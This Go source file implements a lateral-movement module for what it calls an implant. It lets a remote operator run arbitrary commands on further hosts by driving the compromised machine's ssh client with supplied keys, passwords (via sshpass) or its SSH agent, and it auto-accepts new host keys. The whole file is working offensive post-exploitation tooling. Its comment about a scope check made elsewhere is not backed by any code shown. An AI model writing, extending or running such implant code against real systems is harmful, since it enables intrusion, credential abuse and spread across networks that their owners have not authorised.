// Package lateral provides gated remote-execution primitives. The only
// adapter in this cut is SSH: it relies on the target's ssh client rather than
// linking a protocol library, so the base implant keeps CGO_ENABLED=0 and no
// new dependency. Targets are scope-checked by the caller before dispatch.
package lateral

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// SSHRequest describes one SSH command. Exactly one of KeyPath or Password is
// normally set; with neither, the target's SSH agent/default key is used.
type SSHRequest struct {
	Target         string `json:"target"`
	Port           int    `json:"port"`
	User           string `json:"user"`
	KeyPath        string `json:"key_path,omitempty"`
	Password       string `json:"password,omitempty"`
	Command        string `json:"command"`
	TimeoutSeconds int    `json:"timeout_seconds,omitempty"`
}

// SSHResult is returned even when the remote command exits non-zero; the
// operator sees the exit code and stderr instead of an opaque failure.
type SSHResult struct {
	Target   string `json:"target"`
	User     string `json:"user"`
	ExitCode int    `json:"exit_code"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
}

const (
	defaultSSHPort    = 22
	defaultSSHTimeout = 60 * time.Second
	maxSSHTimeout     = 15 * time.Minute
)

// ParseSSHRequest decodes and validates the lateral_ssh argument object.
func ParseSSHRequest(args string) (SSHRequest, error) {
	var req SSHRequest
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		return req, fmt.Errorf("lateral_ssh args must be JSON: %w", err)
	}
	req.Target = strings.TrimSpace(req.Target)
	req.User = strings.TrimSpace(req.User)
	req.Command = strings.TrimSpace(req.Command)
	if req.Target == "" {
		return req, fmt.Errorf("lateral_ssh requires a target")
	}
	if req.User == "" {
		return req, fmt.Errorf("lateral_ssh requires a user")
	}
	if req.Command == "" {
		return req, fmt.Errorf("lateral_ssh requires a command")
	}
	if req.Port == 0 {
		req.Port = defaultSSHPort
	}
	if req.Port < 1 || req.Port > 65535 {
		return req, fmt.Errorf("lateral_ssh port %d is out of range", req.Port)
	}
	if req.KeyPath != "" && req.Password != "" {
		return req, fmt.Errorf("lateral_ssh accepts a key_path or a password, not both")
	}
	return req, nil
}

// SSH runs the command on the target through its ssh client.
func SSH(ctx context.Context, req SSHRequest) (SSHResult, error) {
	result := SSHResult{Target: req.Target, User: req.User}

	timeout := defaultSSHTimeout
	if req.TimeoutSeconds > 0 {
		timeout = time.Duration(req.TimeoutSeconds) * time.Second
		if timeout > maxSSHTimeout {
			timeout = maxSSHTimeout
		}
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	program, args, env, err := commandFor(req)
	if err != nil {
		return result, err
	}

	cmd := exec.CommandContext(ctx, program, args...)
	cmd.Env = append(os.Environ(), env...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	runErr := cmd.Run()
	result.Stdout = stdout.String()
	result.Stderr = stderr.String()
	if runErr == nil {
		return result, nil
	}

	var exitErr *exec.ExitError
	if errors.As(runErr, &exitErr) {
		result.ExitCode = exitErr.ExitCode()
		return result, nil
	}
	if ctx.Err() != nil {
		return result, fmt.Errorf("lateral_ssh timed out after %s", timeout)
	}
	return result, runErr
}

// commandFor builds the ssh invocation. A password is passed through the
// SSHPASS environment variable (sshpass -e), never on the command line, so it
// does not appear in the target's process list.
func commandFor(req SSHRequest) (string, []string, []string, error) {
	sshArgs := []string{
		"-o", "StrictHostKeyChecking=accept-new",
		"-o", "ConnectTimeout=10",
		"-o", "BatchMode=" + batchMode(req),
		"-p", strconv.Itoa(req.Port),
	}
	if req.KeyPath != "" {
		sshArgs = append(sshArgs, "-i", req.KeyPath, "-o", "IdentitiesOnly=yes")
	}
	sshArgs = append(sshArgs, req.User+"@"+req.Target, req.Command)

	if req.Password == "" {
		return "ssh", sshArgs, nil, nil
	}

	sshpass, err := exec.LookPath("sshpass")
	if err != nil {
		return "", nil, nil, fmt.Errorf("password authentication requires sshpass on the target: %w", err)
	}
	return sshpass, append([]string{"-e", "ssh"}, sshArgs...), []string{"SSHPASS=" + req.Password}, nil
}

func batchMode(req SSHRequest) string {
	if req.Password == "" && req.KeyPath == "" {
		return "no" // allow the agent/prompt path
	}
	return "yes"
}
